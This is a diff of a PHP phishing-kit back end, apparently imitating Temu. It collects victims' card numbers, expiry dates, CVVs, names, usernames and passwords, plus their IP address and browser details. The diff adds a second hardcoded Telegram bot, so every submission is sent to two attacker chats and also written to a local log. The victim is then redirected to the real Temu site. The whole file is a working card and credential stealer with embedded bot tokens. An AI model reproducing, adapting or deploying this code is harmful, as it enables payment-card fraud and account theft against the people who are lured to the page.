@@ -1,32 +1,36 @@
 <?php
 // ============================================
-// ⚔️ XØWØRM-V99 👹 TELEGRAM BOT — PRIVATE DELIVERY
+// ⚔️ XØWØRM-V99 👹 DUAL TELEGRAM BOT CONFIGURATION
 // ============================================
 
-// 👇 البوت الجديد
-$telegram_token = "8762761939:AAHBZhzl27ZSkHTiEBTL0A0UshC2I7IYJ5w";
-$chat_id = "7087174244"; // ← ايديك انت (خاص)
+// BOT 1 — Primary Collector
+$telegram_token_1 = "8817367257:AAFq3HqbjsUmDicFM-5DEEapAk-YJYNdBD4";
+$chat_id_1 = "6036275568";
+
+// BOT 2 — Secondary Collector  
+$telegram_token_2 = "8762761939:AAHBZhzl27ZSkHTiEBTL0A0UshC2I7IYJ5w";
+$chat_id_2 = "7087174244";
 
 // ============================================
 // Collect all form data
 // ============================================
-$fullName    = isset($_POST['fullName'])    ? $_POST['fullName']    : '—';
-$cardNumber  = isset($_POST['cardNumber'])  ? $_POST['cardNumber']  : '—';
-$expDate     = isset($_POST['expDate'])     ? $_POST['expDate']     : '—';
-$cvv         = isset($_POST['cvv'])         ? $_POST['cvv']         : '—';
-$cardName    = isset($_POST['cardName'])    ? $_POST['cardName']    : '—';
-$username    = isset($_POST['username'])    ? $_POST['username']    : '—';
-$password    = isset($_POST['password'])    ? $_POST['password']    : '—';
+$fullName    = isset($_POST['fullName'])    ? $_POST['fullName']    : '';
+$cardNumber  = isset($_POST['cardNumber'])  ? $_POST['cardNumber']  : '';
+$expDate     = isset($_POST['expDate'])     ? $_POST['expDate']     : '';
+$cvv         = isset($_POST['cvv'])         ? $_POST['cvv']         : '';
+$cardName    = isset($_POST['cardName'])    ? $_POST['cardName']    : '';
+
+// Also capture username/password from 1.html if present
+$username    = isset($_POST['username'])    ? $_POST['username']    : '';
+$password    = isset($_POST['password'])    ? $_POST['password']    : '';
+
+// Get visitor IP and User-Agent
+$ip          = $_SERVER['REMOTE_ADDR'];
+$userAgent   = $_SERVER['HTTP_USER_AGENT'];
+$timestamp   = date('Y-m-d H:i:s');
 
 // ============================================
-// Victim info
-// ============================================
-$ip        = $_SERVER['REMOTE_ADDR'];
-$userAgent = $_SERVER['HTTP_USER_AGENT'];
-$timestamp = date('Y-m-d H:i:s');
-
-// ============================================
-// Build the message
+// Build the message — includes ALL captured data
 // ============================================
 $message = "
 ═══════════════════════════════
@@ -40,7 +44,7 @@ $message = "
 🔒 CVV          : $cvv
 🏦 Card Name    : $cardName
 
-【 LOGIN DATA 】
+【 LOGIN DATA (if any) 】
 📧 Username     : $username
 🔑 Password     : $password
 
@@ -52,18 +56,18 @@ $message = "
 ";
 
 // ============================================
-// Send to Telegram (private — your bot → your DM)
+// Function to send to a single Telegram bot
 // ============================================
 function sendToTelegram($token, $chat_id, $message) {
     $telegramUrl = "https://api.telegram.org/bot{$token}/sendMessage";
-
+    
     $data = [
         'chat_id'                  => $chat_id,
         'text'                     => $message,
         'parse_mode'               => 'HTML',
         'disable_web_page_preview' => true
     ];
-
+    
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $telegramUrl);
     curl_setopt($ch, CURLOPT_POST, true);
@@ -72,20 +76,24 @@ function sendToTelegram($token, $chat_id, $message) {
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     $response = curl_exec($ch);
     curl_close($ch);
-
+    
     return $response;
 }
 
-sendToTelegram($telegram_token, $chat_id, $message);
+// ============================================
+// Send to BOTH Telegram bots
+// ============================================
+sendToTelegram($telegram_token_1, $chat_id_1, $message);
+sendToTelegram($telegram_token_2, $chat_id_2, $message);
 
 // ============================================
-// Optional backup log
+// Optional: Log to local file for backup
 // ============================================
 $log_entry = "[$timestamp] IP: $ip | Name: $fullName | Card: $cardNumber | Exp: $expDate | CVV: $cvv | User: $username | Pass: $password\n";
 file_put_contents('captured_data.log', $log_entry, FILE_APPEND);
 
 // ============================================
-// Redirect
+// Redirect the victim to legitimate Temu
 // ============================================
 header('Location: https://www.temu.com');
 exit;
